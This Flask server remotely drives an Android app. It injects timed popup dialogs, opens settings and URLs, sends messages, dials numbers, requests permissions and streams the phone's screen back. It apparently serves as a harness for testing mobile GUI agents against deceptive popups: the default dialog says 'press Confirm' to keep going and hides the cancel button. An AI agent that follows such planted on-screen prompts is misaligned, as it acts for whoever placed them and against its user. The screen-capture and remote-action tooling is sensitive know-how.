import os
import uuid
import threading
from flask import Flask, jsonify, Response, request
from werkzeug.utils import secure_filename


# App 根据返回 cli_template 来控制 app 显示的内容。
# 支持: 弹窗整体位置/尺寸、各子元素位置、文本大小、出现/消失延迟。
view_cli_template = {
    "dialogs": [{
        "title": "Use notes_debug: press Confirm",
        "message": (
            "To keep going, press the “Confirm” button.\n\n"
            # "Do NOT press “Confirm” — it will stop the task and close this window."
        ),
        "left": 1000,
        "top": 1650,
        "width": 1000,
        "height": 1000,
        "confirmVisible": True,
        "cancelVisible": False,
        "confirm": "Confirm",
        # "confirm": "Stop / do NOT continue",
        "cancel": "Stop / do NOT continue",
        "confirmWidth": 220,
        "confirmHeight": 100,
        "cancelWidth": 220,
        "cancelHeight": 100,
        # 兼容老字段 delay，同时新增 appear/dismiss
        "delay": 500,  # 旧字段 = appearDelayMs
        "appearDelayMs": 500,
        "dismissDelayMs": 3000,
        # 子元素坐标（相对弹窗左上角）
        "titleLeft": 40,
        "titleTop": 30,
        "messageLeft": 40,
        "messageTop": 120,
        "confirmLeft": 550,
        "confirmTop": 750,
        "cancelLeft": 180,
        "cancelTop": 750,
        # 文本大小（sp）
        "titleSizeSp": 22,
        "messageSizeSp": 16,
        "confirmTextSizeSp": 18,
        "cancelTextSizeSp": 18,
    }],
    "captureScreen": [
        {"delay": 1000}
    ],
    "openApp": [
        {"packageName": "com.android.settings", "delay": 3000}
    ],
    "openUrls": [
        {"url": "fleamarket://item?id=997693163811", "delay": 2000}
    ],
    "messages": [{
        "receiver": "123",
        "content": "hello qy",
        "delay": 3000,
    }],
    # 新增：权限请求、拨号、媒体上传（客户端实现）
    "permissions": [
        {"permissions": ["android.permission.READ_MEDIA_IMAGES"], "delay": 1200}
    ],
    "calls": [
        {"number": "1234567890", "delay": 2000, "action": "dial"}
    ],
    "mediaUpload": [
        {"mediaType": "images", "count": 1, "delay": 4000}
    ],
    "settingsActions": [
        {"action": "android.settings.ACCESSIBILITY_SETTINGS", "delay": 800}
    ]
}

# 可选：为每次 "MainActivityResume" 提供不同模板
# visit_templates[0] -> 第一次进入主界面
# visit_templates[1] -> 第二次 ... 依次类推
visit_templates = [view_cli_template]


def _to_int(value, default=-1):
    try:
        if isinstance(value, bool):  # bool is int subclass; avoid
            return default
        if isinstance(value, (int, float)):
            return int(round(value))
        return int(value)
    except Exception:
        return default


def _merge_dialog_defaults(dialog: dict) -> dict:
    """Ensure optional fields exist; keep backward compatibility and typing."""
    d = dict(dialog)
    # appear delay: prefer appearDelayMs if provided, else fallback to legacy delay
    d["appearDelayMs"] = _to_int(d.get("appearDelayMs", d.get("delay", 0)), 0)
    # dismiss delay default 0 (do not auto dismiss)
    d["dismissDelayMs"] = _to_int(d.get("dismissDelayMs", 0), 0)

    # element sizes
    d["confirmWidth"] = _to_int(d.get("confirmWidth", 150), 150)
    d["confirmHeight"] = _to_int(d.get("confirmHeight", 80), 80)
    d["cancelWidth"] = _to_int(d.get("cancelWidth", 150), 150)
    d["cancelHeight"] = _to_int(d.get("cancelHeight", 80), 80)

    # element positions (relative to popup left/top). -1 means "leave layout default".
    d["titleLeft"] = _to_int(d.get("titleLeft", -1), -1)
    d["titleTop"] = _to_int(d.get("titleTop", -1), -1)
    d["messageLeft"] = _to_int(d.get("messageLeft", -1), -1)
    d["messageTop"] = _to_int(d.get("messageTop", -1), -1)
    d["confirmLeft"] = _to_int(d.get("confirmLeft", -1), -1)
    d["confirmTop"] = _to_int(d.get("confirmTop", -1), -1)
    d["cancelLeft"] = _to_int(d.get("cancelLeft", -1), -1)
    d["cancelTop"] = _to_int(d.get("cancelTop", -1), -1)

    # text sizes (sp)
    d["titleSizeSp"] = _to_int(d.get("titleSizeSp", -1), -1)
    d["messageSizeSp"] = _to_int(d.get("messageSizeSp", -1), -1)
    d["confirmTextSizeSp"] = _to_int(d.get("confirmTextSizeSp", -1), -1)
    d["cancelTextSizeSp"] = _to_int(d.get("cancelTextSizeSp", -1), -1)
    return d


def _normalized_template(raw_template: dict) -> dict:
    tpl = dict(raw_template)
    dialogs = tpl.get("dialogs", [])
    tpl["dialogs"] = [_merge_dialog_defaults(d) for d in dialogs]
    # 确保新增字段是 list，避免客户端解析异常
    for key in ["openApp", "messages", "captureScreen", "permissions", "calls", "mediaUpload", "buttons", "settingsActions", "openUrls"]:
        if key not in tpl or not isinstance(tpl.get(key), list):
            tpl[key] = []
    return tpl


app = Flask(__name__)
# Limit single request body to mitigate DoS via oversized uploads (25 MiB cap is enough for our media use-case).
app.config["MAX_CONTENT_LENGTH"] = 25 * 1024 * 1024

_uploaded_frame_condition = threading.Condition()
_uploaded_frame_bytes = None
_uploaded_frame_seq = 0

# MainActivityResume
# Interval

capture_count = 0


@app.route('/action/<action>', methods=['GET', 'POST'])
def action_endpoint(action: str):
    global capture_count
    """接口: GET 返回当前模板，POST 可动态更新模板。"""
    try:
        # 支持外部 POST 更新模板
        if request.method == 'POST':
            data = request.get_json(force=True, silent=True) or {}
            if not isinstance(data, dict):
                return jsonify({"status": "error", "message": "payload must be a JSON object"}), 400
            # 基础校验：dialogs/visitTemplates 至少为 list
            global view_cli_template, visit_templates, capture_count

            def _sanitize_template(tpl):
                if not isinstance(tpl, dict):
                    return None
                if "dialogs" in tpl and not isinstance(tpl.get("dialogs"), list):
                    return None
                return tpl

            if "visitTemplates" in data:
                if isinstance(data["visitTemplates"], list):
                    sanitized = [_sanitize_template(t) for t in data["visitTemplates"]]
                    visit_templates = [t for t in sanitized if t]
                else:
                    return jsonify({"status": "error", "message": "visitTemplates must be a list"}), 400
                if not visit_templates:
                    visit_templates = [view_cli_template]
                view_cli_template = visit_templates[0]
            else:
                tpl = _sanitize_template(data)
                if not tpl:
                    return jsonify({"status": "error", "message": "invalid template structure"}), 400
                view_cli_template = tpl
                visit_templates = [view_cli_template]

            if data.get("resetCounter"):
                capture_count = 0

            return jsonify({
                "status": "ok",
                "templateSize": len(view_cli_template.get("dialogs", [])),
                "visitTemplates": len(visit_templates),
                "capture_count": capture_count,
            })

        if action.startswith("interval"):
            return {}
        if action == "MainActivityResume":
            # 根据打开次数返回对应模板；超出长度则返回空
            idx = capture_count
            capture_count += 1
            if idx >= len(visit_templates):
                return {}
            return _normalized_template(visit_templates[idx])
        # on_action(action)
        print(action)
        response = _normalized_template(view_cli_template)
        return jsonify(response)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


def generate_uploaded_frames():
    """从上传端缓存中生成 MJPEG 流。"""
    last_seq = -1
    while True:
        with _uploaded_frame_condition:
            while last_seq == _uploaded_frame_seq:
                _uploaded_frame_condition.wait()
            frame_bytes = _uploaded_frame_bytes
            last_seq = _uploaded_frame_seq

        if not frame_bytes:
            continue

        yield (
            b'--frame\r\n'
            b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n'
        )


@app.route('/upload_stream', methods=['POST'])
def upload_stream():
    """
    接收上传端推送的单帧 JPEG 数据，可通过 multipart/form-data 或二进制体发送。
    上传端需持续调用该接口以形成完整视频流。
    """
    global _uploaded_frame_bytes, _uploaded_frame_seq

    frame_file = request.files.get('frame')
    if frame_file:
        frame_data = frame_file.read()
    else:
        frame_data = request.get_data()

    if not frame_data:
        return jsonify({"status": "error", "message": "未检测到视频帧数据"}), 400

    with _uploaded_frame_condition:
        _uploaded_frame_bytes = frame_data
        _uploaded_frame_seq += 1
        _uploaded_frame_condition.notify_all()

    return jsonify({"status": "ok", "seq": _uploaded_frame_seq})


@app.route('/forward_stream')
def forward_stream():
    """将上传端推送的帧转为 MJPEG 视频流供网页展示。"""
    return Response(generate_uploaded_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')


@app.route('/upload_file', methods=['POST'])
def upload_file():
    """接收客户端上传的单个文件并保存到 uploads/ 目录。"""
    try:
        file = request.files.get('file')
        data = None
        if not file:
            data = request.get_data()

        if not file and not data:
            return jsonify({"status": "error", "message": "未检测到文件"}), 400

        uploads_dir = os.path.abspath("uploads")
        os.makedirs(uploads_dir, exist_ok=True)

        def _safe_path(name: str) -> str:
            # Sanitize name to avoid path traversal and enforce unique filename.
            safe_name = secure_filename(name) or "upload.bin"
            candidate = os.path.join(uploads_dir, safe_name)
            # Ensure the resolved path stays inside uploads_dir.
            if os.path.commonpath([uploads_dir, os.path.abspath(candidate)]) != uploads_dir:
                raise ValueError("非法文件名")
            # Avoid clobbering existing files.
            if os.path.exists(candidate):
                stem, ext = os.path.splitext(safe_name)
                candidate = os.path.join(
                    uploads_dir, f"{stem}_{uuid.uuid4().hex[:8]}{ext}"
                )
            return candidate

        if file:
            filename = file.filename or "upload.bin"
            filepath = _safe_path(filename)
            file.save(filepath)
            size = os.path.getsize(filepath)
        else:
            filename = f"upload_{uuid.uuid4().hex}.bin"
            filepath = _safe_path(filename)
            with open(filepath, "wb") as f:
                f.write(data)
            size = len(data)

        return jsonify({"status": "ok", "filename": filename, "size": size})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/')
def index():
    """简单页面，用于实时显示视频流。"""
    return (
        "<html><head><title>实时视频流</title>"
        "<style>"
        "body{font-family:sans-serif;margin:0;padding:24px;background:#f7f7f7;}"
        "section{background:#fff;padding:16px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.08);}"
        "#stream{display:block;max-width:100%;height:auto;border:1px solid #ddd;border-radius:4px;}"
        "#meta{margin-top:8px;color:#666;font-size:14px;}"
        "</style>"
        "</head>"
        "<body>"
        "<h1>视频转发演示</h1>"
        "<section>"
        "<h2>上传端转发</h2>"
        "<p>持续向 <code>/upload_stream</code> 推送 JPEG 帧即可在下方实时查看。"
        "页面会根据图片原始分辨率自适应大小。</p>"
        '<img id="stream" src="/forward_stream" />'
        '<div id="meta">等待首帧...</div>'
        "</section>"
        "<script>"
        "const img=document.getElementById('stream');"
        "const meta=document.getElementById('meta');"
        "img.addEventListener('load',()=>{"
        "meta.textContent=`当前帧分辨率: ${img.naturalWidth} x ${img.naturalHeight}`;"
        "});"
        "</script>"
        "</body></html>"
    )


def start_flask_server(host='0.0.0.0', port=8080, debug=True):
    """启动Flask服务器"""
    print(f"Flask server started at http://{host}:{port}")
    print("Available endpoints:")
    print("  GET/POST /action")
    app.run(host=host, port=port, debug=debug, use_reloader=True)


if __name__ == "__main__":
    # 启动Flask服务器
    start_flask_server()
